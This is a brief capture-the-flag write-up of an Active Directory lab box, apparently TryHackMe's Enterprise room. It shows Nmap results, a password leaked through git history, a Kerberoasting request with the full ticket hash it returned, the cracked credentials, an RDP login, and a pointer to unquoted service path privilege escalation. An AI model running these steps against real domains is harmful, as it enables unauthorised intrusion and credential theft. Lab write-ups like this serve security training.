## Nmap

```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: LAB-ENTERPRISE
|   NetBIOS_Domain_Name: LAB-ENTERPRISE
|   NetBIOS_Computer_Name: LAB-DC
|   DNS_Domain_Name: LAB.ENTERPRISE.THM
|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM
|   DNS_Tree_Name: ENTERPRISE.THM
|   Product_Version: 10.0.17763
|_  System_Time: 2021-03-20T11:23:00+00:00
| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Not valid before: 2021-03-11T02:11:05
|_Not valid after:  2021-09-10T02:11:05
|_ssl-date: 2021-03-20T11:23:14+00:00; +1s from scanner time.
```

# Port 7990

THM-Enterprise Github hint thats the old git commit shows nik user password.

nik:ToastyBoi!

we can try to get a ticket for a “Service Principal Name”. 

```bash
┌──(arun㉿kali)-[~/AD/AD-THM-Rooms/Enterprise/smb]
└─$ impacket-GetUserSPNs lab.enterprise.thm/nik:'ToastyBoi!' -request 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-11 20:20:01.333272  2021-04-26 11:16:41.570158             



$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$lab.enterprise.thm/bitbucket*$37a8cd7bef88adb370e6e9648a4fe151$c929eacca801288ae5df00a39f29c4fdaf3ad60b5ceecb10aa9ba122278e926d7aecb8991487e11ed18c0e5c0d11cd3b8c501e2ecddeccd10c9a663c0a02f5f59931b797e8999c201a17e4559ccd2d7f694ddfaf97071b53fb0f2bf7f4b3bb59751ee51323b8808a69cc4ab345ac2f8045a9f7f4e13509a538af06c2174af13e7d61ef7362b6ecc98c7f972d318bee7740307357cfc402f0aefa14f68478ed45479fbcd2e296432016dcd98c521ff8f2ef19900e9cbad9fd0ab1da083f7c52ea777a6472774270f5a4434bcd03736632686b02b7fb198b4d794026f7bbf2d92661d468de590d7a8e991ef475e5d042d6732f248e47d0622c3acad9ac59e37b43204261301b1f5041c12a6a0b21348938ffd5f8c93aba984aa5bea92a4759783a8fd0f5a5d2c2ce938d77c827ebafcc791345525370ae71956495bccc2bbfdc365bb7e0b4c42f56b562a604cb92c829518814cb789cfa40de0f3cd4da214948126fc8af096cef407bd4b2e3fe5feba2f583aab050c9d0b99ce5a419aa5c0f60adea0067eeecd48140f03a59b13a6722c0db865d06e5309bf97efe3144a54b4861e0563238caec554e16489a111c5674a5af2102c5cb64ef5e932caad75e518dcdb87d011a69d1e451a1c70ccff3aa678ea23ef07f4f0913a0cba29145d3fccec84d5df0ead79a98ffdf95802c8c66886568ef217f6b0079da3f9db065912d52c5254fb4e1815cc207a593d713d48e90d77d09094fc11c860c5f774a49b1551b12194bb261320e05d8b5b2bb7714186468c0326448e95b5901eac9524f26faece246a033d0fff9f9c07b555d19537c73ae454c047c1f3f69fff5b556d06d8934e4dc7e15a6a4041f1130cb9265c7d25283cee91d05cba5906dfa236f8641ff7f29a4996d73effc2f10a6d0f19ca47611bb32e4551f068d5cfde6b168fb64be043d69ae3a2fab0e85c65e0eefdf5569cb5bc603066ee0230390c9a309c73f838208a54cf0d5a48f73e02058c5650cf065a4b23b30678274d3ae15288f39c60c874f59968a4ebae914e8d82a301e7ef5a5b3f5997a01a03831061a9407b42c1d8aea763108c6a13926bdc43f470299846334a4b4ed00b8ab7900b6d3e8d77bc6f4149ad7f160fd6922da3076551b4969d19bf98f8719eaa03134875833722cd3b99883bb36b0e82f49548ecd3afc89b00e7cd3d23c5dd5ba2142621db8366aee7399e5337081774ccc9b834fdb5f201125b0cfb0ab87a78633d20c870132621402c3db44926abca00f53e9360724c2b965bcafec462a84bd21f37add83ec30851b53fa5e02df2e91783d54fa5c3b4b59bba179225a4b494efc63599f2007c45c555781d956
```

hash cracked : bitbucket:littleredbucket

bitbucket has rdp access let try

``
 xfreerdp /u:bitbucket /p:littleredbucket /v:lab.enterprise.thm /dynamic-resolution
``

## Privilege escalation

Unquoted service path

``
C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe
``

https://medium.com/@orhan_yildirim/windows-privilege-escalation-unquoted-service-paths-61d19a9a1a6a









